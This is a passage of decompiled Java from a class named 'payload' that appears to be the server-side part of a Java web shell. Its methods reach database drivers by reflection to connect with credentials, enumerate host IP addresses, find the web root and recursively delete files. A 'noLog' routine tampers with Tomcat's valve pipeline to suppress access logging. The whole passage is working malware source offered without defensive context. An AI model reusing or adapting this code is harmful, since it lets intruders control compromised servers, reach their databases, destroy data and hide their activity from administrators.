                    var10000 = Class.forName("java.sql.DriverManager");
                } catch (ClassNotFoundException var15) {
                    throw new NoClassDefFoundError(var15.getMessage());
                }

            }

            Field[] fields = var10000.getDeclaredFields();
            Field field = null;

            for(int i = 0; i < fields.length; ++i) {
                field = fields[i];
                if (field.getName().indexOf("rivers") != -1) {
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("java.util.List");
                        } catch (ClassNotFoundException var14) {
                            throw new NoClassDefFoundError(var14.getMessage());
                        }

                    }

                    if (var10000.isAssignableFrom(field.getType())) {
                        break;
                    }
                }

                field = null;
            }

            if (field != null) {
                field.setAccessible(true);
                List drivers = (List)field.get((Object)null);
                Iterator iterator = drivers.iterator();

                while(iterator.hasNext() && connection == null) {
                    try {
                        Object object = iterator.next();
                        Driver driver = null;
                        var10000 = null;
                        if (var10000 == null) {
                            try {
                                var10000 = Class.forName("java.sql.Driver");
                            } catch (ClassNotFoundException var13) {
                                throw new NoClassDefFoundError(var13.getMessage());
                            }

                        }

                        if (!var10000.isAssignableFrom(object.getClass())) {
                            Field[] driverInfos = object.getClass().getDeclaredFields();

                            for(int i = 0; i < driverInfos.length; ++i) {
                                if (var10000 == null) {
                                    try {
                                        var10000 = Class.forName("java.sql.Driver");
                                    } catch (ClassNotFoundException var12) {
                                        throw new NoClassDefFoundError(var12.getMessage());
                                    }

                                }

                                if (var10000.isAssignableFrom(driverInfos[i].getType())) {
                                    driverInfos[i].setAccessible(true);
                                    driver = (Driver)driverInfos[i].get(object);
                                    break;
                                }
                            }
                        }

                        if (driver != null) {
                            Properties properties = new Properties();
                            if (userName != null) {
                                properties.put("user", userName);
                            }

                            if (password != null) {
                                properties.put("password", password);
                            }

                            connection = driver.connect(url, properties);
                        }
                    } catch (Exception var16) {
                    }
                }
            }
        } catch (Exception var17) {
        }

        return connection;
    }

    public static String getLocalIPList() {
        ArrayList ipList = new ArrayList();

        try {
            Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();

            while(networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface)networkInterfaces.nextElement();
                Enumeration inetAddresses = networkInterface.getInetAddresses();

                while(inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress)inetAddresses.nextElement();
                    if (inetAddress != null) {
                        String ip = inetAddress.getHostAddress();
                        ipList.add(ip);
                    }
                }
            }
        } catch (Exception var6) {
        }

        return Arrays.toString(ipList.toArray());
    }

    public String getRealPath() {
        try {
            if (this.servletContext != null) {
                Class var10001 = this.servletContext.getClass();
                Class[] var10003 = new Class[1];
                Class var10006 = null;
                if (var10006 == null) {
                    try {
                        var10006 = Class.forName("java.lang.String");
                    } catch (ClassNotFoundException var3) {
                        throw new NoClassDefFoundError(var3.getMessage());
                    }

                }

                var10003[0] = var10006;
                Method getRealPathMethod = this.getMethodByClass(var10001, "getRealPath", var10003);
                if (getRealPathMethod != null) {
                    Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
                    return retObject != null ? retObject.toString() : "Null";
                } else {
                    return "no method getRealPathMethod";
                }
            } else {
                return "servletContext is Null";
            }
        } catch (Exception var4) {
            return var4.getMessage();
        }
    }

    public void deleteFiles(File f) throws Exception {
        if (f.isDirectory()) {
            File[] x = f.listFiles();

            for(int i = 0; i < x.length; ++i) {
                File fs = x[i];
                this.deleteFiles(fs);
            }
        }

        f.delete();
    }

    Object invoke(Object obj, String methodName, Object[] parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            Method method = this.getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null) {
                return method.invoke(obj, parameters);
            }
        } catch (Exception var6) {
        }

        return null;
    }

    public static void main(String[] args) {
        payload payload = new payload();
        String atr = "attack";
        System.out.println(payload.getMethodAndInvoke(atr, "toString", (Class[])null, (Object[])null));
    }

    Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private void noLog(Object servletContext) {
        try {
            Object applicationContext = getFieldValue(servletContext, "context");
            Object container = getFieldValue(applicationContext, "context");

            ArrayList arrayList;
            for(arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", (Object[])null)) {
                arrayList.add(container);
            }

            label84:
            for(int i = 0; i < arrayList.size(); ++i) {
                try {
                    Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                        while(true) {
                            while(true) {
                                if (valve == null) {
                                    continue label84;
                                }

                                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null) {
                                    Class var10001 = valve.getClass();
                                    Class[] var10003 = new Class[1];
                                    Class var10006 = null;
                                    if (var10006 == null) {
                                        try {
                                            var10006 = Class.forName("java.lang.String");
                                        } catch (ClassNotFoundException var12) {
                                            throw new NoClassDefFoundError(var12.getMessage());
                                        }

                                    }

                                    var10003[0] = var10006;
                                    if (this.getMethodByClass(var10001, "setCondition", var10003) != null) {
                                        String condition = (String)this.invoke((String)valve, "getCondition", new Object[0]);
                                        condition = condition == null ? "FuckLog" : condition;
                                        this.invoke(valve, "setCondition", new Object[]{condition});
                                        var10001 = this.servletRequest.getClass();
                                        var10003 = new Class[2];
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var11) {
                                                throw new NoClassDefFoundError(var11.getMessage());
                                            }

                                        }

                                        var10003[0] = var10006;
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var10) {
                                                throw new NoClassDefFoundError(var10.getMessage());
                                            }

                                        }

                                        var10003[1] = var10006;
                                        Method setAttributeMethod = this.getMethodByClass(var10001, "setAttribute", var10003);
                                        setAttributeMethod.invoke(condition, condition);
                                        valve = this.invoke(valve, "getNext", (Object[])null);
                                        continue;
                                    }
                                }

                                if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                    valve = this.invoke(valve, "getNext", (Object[])null);
                                } else {
                                    valve = null;
                                }
                            }
                        }
                    }
                } catch (Exception var13) {
                }
            }
        } catch (Exception var14) {
        }

    }

    private static Class getClass(String name) {
        try {
            return Class.forName(name);
        } catch (Exception var2) {
            return null;
        }
    }

    public static int bytesToInt(byte[] bytes) {
        int i = bytes[0] & 255 | (bytes[1] & 255) << 8 | (bytes[2] & 255) << 16 | (bytes[3] & 255) << 24;
        return i;
    }

    public String base64Encode(String data) {
        return base64Encode(data.getBytes());
    }

    public static String base64Encode(byte[] src) {
        int off = 0;
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        int linemax = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }

        int dp;
        int b0;
        int b1;
        for(dp = 0; sp < sl; sp = b0) {
            b0 = Math.min(sp + slen, sl);
            b1 = sp;

            int bits;
            for(int var13 = dp; b1 < b0; dst[var13++] = (byte)base64[bits & 63]) {
                bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
                dst[var13++] = (byte)base64[bits >>> 18 & 63];
                dst[var13++] = (byte)base64[bits >>> 12 & 63];
                dst[var13++] = (byte)base64[bits >>> 6 & 63];
            }

            b1 = (b0 - sp) / 3 * 4;
            dp += b1;
        }

        if (sp < end) {
            b0 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[b0 << 4 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            } else {
                b1 = src[sp++] & 255;
                dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
                dst[dp++] = (byte)base64[b1 << 2 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }

        return new String(dst);
    }

    public static byte[] base64Decode(String base64Str) {
        if (base64Str.length() == 0) {
            return new byte[0];
        } else {
            byte[] src = base64Str.getBytes();
            int sp = 0;
            int sl = src.length;
            int paddings = 0;
            int len = sl - sp;
            if (src[sl - 1] == 61) {
                ++paddings;
                if (src[sl - 2] == 61) {
                    ++paddings;
                }
            }

            if (paddings == 0 && (len & 3) != 0) {
                paddings = 4 - (len & 3);
            }

            byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
            int[] base64 = new int[256];
            Arrays.fill(base64, -1);

            int dp;
            for(dp = 0; dp < toBase64.length; base64[toBase64[dp]] = dp++) {
            }

            base64[61] = -2;
            dp = 0;
            int bits = 0;
            int shiftto = 18;

            while(sp < sl) {
                int b = src[sp++] & 255;
                if ((b = base64[b]) < 0 && b == -2) {
                    if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                        throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
                    }
                    break;
                }

                bits |= b << shiftto;
                shiftto -= 6;
                if (shiftto < 0) {
                    dst[dp++] = (byte)(bits >> 16);
                    dst[dp++] = (byte)(bits >> 8);
                    dst[dp++] = (byte)bits;
                    shiftto = 18;
                    bits = 0;
                }
            }

            if (shiftto == 6) {
                dst[dp++] = (byte)(bits >> 16);
            } else if (shiftto == 0) {
                dst[dp++] = (byte)(bits >> 16);
                dst[dp++] = (byte)(bits >> 8);
            } else if (shiftto == 12) {
                throw new IllegalArgumentException("Last unit does not have enough valid bits");
            }

            if (dp != dst.length) {
                byte[] arrayOfByte = new byte[dp];
                System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
                dst = arrayOfByte;
            }

            return dst;
        }
    }
}
